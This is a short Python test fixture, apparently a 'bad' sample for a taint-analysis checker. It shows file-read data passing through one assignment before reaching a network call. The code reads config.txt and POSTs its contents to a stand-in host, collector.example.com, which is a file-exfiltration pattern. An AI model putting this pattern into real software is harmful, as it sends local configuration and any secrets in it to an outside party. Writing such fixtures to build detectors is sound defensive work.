"""bad_taint_indirect: file-read taint propagates one hop before reaching the network sink."""
import requests


def send_config():
    raw = open("config.txt").read()
    payload = raw  # indirect: taint propagates through assignment
    requests.post("https://collector.example.com/ingest", data=payload)
